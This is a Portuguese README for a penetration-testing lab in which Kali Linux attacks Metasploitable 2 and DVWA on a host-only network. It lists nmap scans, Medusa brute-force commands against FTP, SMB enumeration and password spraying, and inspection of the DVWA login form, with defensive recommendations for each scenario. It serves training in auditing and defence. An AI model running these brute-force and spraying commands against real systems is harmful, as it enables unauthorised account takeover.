# Desafio Ataque Brute Force Kali e Medusa
Simulação de Ataque Brute Force com Kali, Medusa e Metasploitable

Sessão  |                       Atividade	                                        |         Entrega da sessão
    1   | Rede Host-Only, endereçamento e instalação/verificação das ferramentas	| Laboratório comunicando e inventário inicial
    2   | Reconhecimento e auditoria controlada do FTP	                            | Log e análise do cenário FTP
    3   | Enumeração SMB e password spraying com conta de teste                     | Log e análise do cenário SMB
    4   | DVWA, formulário web e análise de respostas	                            | Evidências do cenário web
    5	| Logs, mitigação, relatório e GitHub	                                    | Projeto documentado e publicado

Cenário de Testes: Virtual Box com Kali Linux atacante e Metasploitable 2 como alvo. A DVWA roda no Metasploitable 2.
Máquina         	Função              	Endereço de exemplo
Kali Linux	        Estação Atacante	    192.168.56.102/24
Metasploitable 2	Estação Alvo        	192.168.56.101/24
Rede virtual	    Host-Only	            192.168.56.0/24

Confirmação de endereços e teste de comunicação
Kali:
        ip addr
        ip route

Metasploitable 2:
        ifconfig
        route -n

Versões módulos das ferramentas:
    medusa -V
    medusa -d
    nmap --version
    enum4linux
    git --version

Opções de módulos:
    medusa -M ftp -q
    medusa -M smbnt -q
    medusa -M web-form -q

Pasta de trabalho:
    mkdir -p ~/projeto-medusa/{wordlists,logs,evidencias,documentacao,scripts}
    cd ~/projeto-medusa
    sudo apt install tree -y
    tree

Wordlists de teste:
Senhas
    nano wordlists/senhas.txt
     123456
     password
     admin
     admin123
     msfadmin
     qwerty
     12345678

Usuários
    nano wordlists/usuarios.txt
     admin
     msfadmin
     user
     service
     postgres

Conferência dos arquivos:
    cat wordlists/senhas.txt
    cat wordlists/usuarios.txt
    wc -l wordlists/senhas.txt
    wc -l wordlists/usuarios.txt

Cenário 1 — Ataque Servidor de FTP
Objetivo: identificar o serviço FTP no alvo, realizar ataque força-bruta com usuários e senhas criados.

Identificando o serviço e versão

    nmap -sV -p 21 192.168.56.101

Executar ataque com Medusa

medusa -h 192.168.56.101 -u msfadmin -P wordlists/senhas.txt -M ftp -t 1 -f -O logs/ftp_auditoria.log

Interpretação: -h define o alvo; -u define um usuário; -P aponta para a lista de senhas; -M seleciona FTP; -t 1 limita a concorrência; -f solicita interrupção após sucesso no host; -O salva a saída.

Validar e analisar

    cat logs/ftp_auditoria.log
    
    ftp 192.168.56.101

Recomendações defensivas
•	Desativar FTP convencional quando não for necessário; avaliar SFTP ou FTPS.
•	Desabilitar acesso anônimo e restringir usuários autorizados.
•	Aplicar senhas exclusivas e controles de acesso.
•	Restringir o serviço por firewall e segmentação.
•	Monitorar falhas de autenticação e alertar sobre padrões anormais.

. Cenário 2 — Enumeração SMB e Password Spraying

Conceitos
•	SMB é utilizado para compartilhamento de arquivos, impressoras e recursos.
•	TCP 445 é a porta mais comum para SMB diretamente sobre TCP; TCP 139 pode ser usado com NetBIOS.
•	Enumeração coleta informações que o servidor revela, como usuários, grupos e compartilhamentos.
•	Password spraying testa uma senha candidata contra várias contas; não é o mesmo que testar muitas senhas contra uma única conta.

Identificar portas

        nmap -sV -p 139,445 192.168.56.101
        
Enumerar com Enum4linux

        enum4linux -a 192.168.56.101v 

        cat logs/enum4linux-metasploitable

        medusa -h 192.168.56.101 -U wordlists/usuarios_smb.txt -P wordlists/senha_smb.txt -M smbnt -t 1 -O logs/smb_spraying.log

Como a lista de senhas contém apenas uma entrada, este teste demonstra a lógica de password spraying. Não amplie para contas de terceiros nem aumente o volume de tentativas.

Validar com SMBClient

        smbclient -L //192.168.56.101 -U msfadmin
        
Recomendações defensivas
•	Restringir enumeração anônima e exposição de compartilhamentos.
•	Desabilitar SMBv1 quando presente e manter SMB atualizado.
•	Aplicar menor privilégio em contas e pastas compartilhadas.
•	Restringir SMB por firewall e segmentação.
•	Monitorar falhas repetidas e padrões distribuídos de autenticação.
•	Avaliar autenticação multifator e políticas de identidade adequadas ao ambiente.

Cenário 3 — Formulário web com DVWA

Objetivo: compreender por que formulários web exigem análise de sessão, método HTTP, parâmetros e resposta da aplicação. A DVWA deve estar instalada em uma VM isolada e ser usada somente em nível de treinamento.

Verificando instalação e acesso

http://192.168.56.101/dvwa/


click DVWA Security.
Selecionado Low.

Inspecionando a requisição no navegador

Ferramentas de desenvolvedor.
Selecionar a aba Network/Rede.

Testar com login 'admin' e senha '123' - tentativa manual inválida com a conta de laboratório.
Identificar a requisição gerada e registrar o método HTTP, o caminho e os nomes dos campos.
Encontrando um indicador confiável de falha ou sucesso.

Abra a página vulnerável

http://192.168.56.101/dvwa/vulnerabilities/brute/

Abra as Ferramentas de Desenvolvedor

Vá na aba Network (Rede)
Clique na aba Network / Rede.
Marque a opção Persist log.

Digitar admin / 123 e clicar em Login.

Encontrando a requisição que contém a resposta:

Clicar na linha  POST login.php

Selecionar Request

Devera aparecer :
    username: "admin"
    password: "123"
    Login: "Login"

Selecionar Response 

Role o HTML até encontrar a mensagem de erro.

No DVWA será:

    "<div class="message">Login failed</div>"


Essa mensagem será usado pelo scriptDVWA.py para atacar a página.

Recomendação para mitigar essa vulnerabilidade:

Implantar MFA.

